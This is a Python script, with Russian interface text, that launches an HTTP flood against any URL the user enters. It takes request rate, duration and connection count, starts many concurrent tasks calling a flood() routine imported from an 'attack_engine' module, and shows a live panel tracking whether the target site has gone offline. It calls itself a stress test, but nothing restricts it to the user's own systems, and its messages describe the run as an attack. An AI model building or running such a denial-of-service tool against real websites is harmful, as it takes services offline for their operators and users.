import asyncio
import signal
import time
import socket
import aiohttp
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.layout import Layout
from rich.live import Live
from rich.align import Align

from attack_engine import flood
from system_profiler import get_attack_recommendations

ASCII_ART = """
[bold red]
███████╗██╗  ██╗██████╗ ██████╗ ██╗███╗   ██╗
██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██║████╗  ██║
█████╗   ╚███╔╝ ██████╔╝██████╔╝██║██╔██╗ ██║
██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██║██║╚██╗██║
███████╗██╔╝ ██╗██║     ██║  ██║██║██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
       Enjoy  it
[/bold red]
"""


def get_user_input(console: Console, recommendations):
    """Получает параметры атаки от пользователя."""
    console.print("\n[bold cyan]--- Настройка параметров стресс-теста ---[/bold cyan]")
    console.print(f"[dim]Рекомендуемые значения на основе вашей системы:[/dim]")
    console.print(
        f"[dim]  RPS: {recommendations['rps']}, Подключения: {recommendations['connections']}, Длительность: {recommendations['duration']}с[/dim]\n")

    url = console.input("[bold magenta]1. Введите URL цели (например, http://127.0.0.1): [/bold magenta]")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    rps_str = console.input(f"[bold magenta]2. Введите общий RPS (запросов/сек): [/bold magenta]")
    rps = int(rps_str) if rps_str.isdigit() else recommendations['rps']

    duration_str = console.input(f"[bold magenta]3. Введите длительность атаки (в секундах): [/bold magenta]")
    duration = int(duration_str) if duration_str.isdigit() else recommendations['duration']

    connections_str = console.input(f"[bold magenta]4. Введите кол-во одновременных подключений: [/bold magenta]")
    connections = int(connections_str) if connections_str.isdigit() else recommendations['connections']

    return url, rps, duration, connections



async def main():
    console = Console()

    
    console.print(ASCII_ART)


    recommendations = get_attack_recommendations()

    url, rps, duration, connections = get_user_input(console, recommendations)

    console.print("\n[bold green]Параметры установлены. Нажмите Enter для начала атаки...[/bold green]")
    input()

    console.clear()
    stop_event = asyncio.Event()
    stats = {
        'total_requests': 0, 'success_requests': 0, 'server_errors': 0,
        'client_errors': 0, 'timeouts': 0, 'connection_errors': 0, 'other_errors': 0,
    }


    connector = aiohttp.TCPConnector(force_close=True, limit=0, ssl=False, family=socket.AF_INET)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        rps_per_connection = rps / connections
        tasks = []
        for _ in range(connections):
            task = asyncio.create_task(flood(session, url, rps_per_connection, duration, stats, stop_event))
            tasks.append(task)

        start_time = time.time()
        site_status = {"status_code": None, "error": None}

       
        async def check_site_status():
            """Периодически проверяет статус сайта и обновляет словарь."""
            while not stop_event.is_set():
                try:
                   
                    async with session.head(url, timeout=5) as response:
                        site_status["status_code"] = response.status
                        site_status["error"] = None
                except asyncio.TimeoutError:
                    site_status["status_code"] = None
                    site_status["error"] = "Timeout"
                except aiohttp.ClientError as e:
                    site_status["status_code"] = None
                    site_status["error"] = "Connection Error"
                except Exception as e:
                    site_status["status_code"] = None
                    site_status["error"] = "Unknown Error"

               
                await asyncio.sleep(1)

        status_task = asyncio.create_task(check_site_status())

        def create_live_display():
            """Создает простой дисплей для live-отображения."""
            elapsed_time = time.time() - start_time

      
            status_line = ""
            if site_status["status_code"] is not None:
                if 200 <= site_status["status_code"] < 400:
                    status_line = f"Статус сайта: [bold green]Онлайн ({site_status['status_code']})[/bold green]"
                else:
                    status_line = f"Статус сайта: [bold yellow]Проблемы ({site_status['status_code']})[/bold yellow]"
            elif site_status["error"]:
                status_line = f"Статус сайта: [bold red]Офлайн ({site_status['error']})[/bold red]"
            else:
                status_line = "Статус сайта: [dim]Проверка...[/dim]"

            info_panel = Panel(
                f"Цель: [bold yellow]{url}[/bold yellow]\n"
                f"{status_line}\n"  
                f"Длительность: {duration} сек | Подключений: {connections}\n"
                f"Всего запросов: [bold green]{stats['total_requests']}[/bold green] | Успешно: [bold green]{stats['success_requests']}[/bold green] | Ошибки сервера: [bold red]{stats['server_errors']}[/bold red]\n"
                f"[bold red]Нажмите Ctrl+C для преждевременной остановки[/bold red]",
                title="🔥 Статистика Атаки 🔥",
                border_style="red"
            )

            progress = Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=None),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
            )
            task_progress = progress.add_task("[green]Прогресс атаки...", total=duration)
            progress.update(task_progress, completed=min(elapsed_time, duration))

            layout = Layout()
            layout.split_column(
                Layout(info_panel, ratio=1),
                Layout(Align.center(progress), size=8)
            )

            return layout

        with Live(console=console, refresh_per_second=4, transient=False) as live:
          
            all_tasks = tasks + [status_task]
            while not all(task.done() for task in all_tasks) and not stop_event.is_set():
                live.update(create_live_display())
                await asyncio.sleep(0.25)

        
        if not stop_event.is_set():
            await asyncio.gather(*all_tasks)  
        console.clear()
        final_elapsed_time = time.time() - start_time
        if stop_event.is_set():
            console.print("\n[bold red]Атака была преждевременно остановлена пользователем.[/bold red]")
        else:
            console.print(f"\n[bold green]Атака успешно завершена за {final_elapsed_time:.2f} секунд.[/bold green]")

        console.print(f"[bold yellow]Всего отправлено запросов: {stats['total_requests']}[/bold yellow]")


def handle_shutdown(signum, frame):
    """Оброботка Ctrl+C"""
    print("\n[bold yellow] Получено сигнал остановки..[/bold yellow]")
  
    raise KeyboardInterrupt

if __name__ == "__main__":
   
    signal.signal(signal.SIGINT, handle_shutdown)

    try:
       
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[bold red]Программа остановленна пользователем.[/bold red]")
    except Exception as e:
        print(f"\n[bold red]Ошибка: {e}[/bold red]")
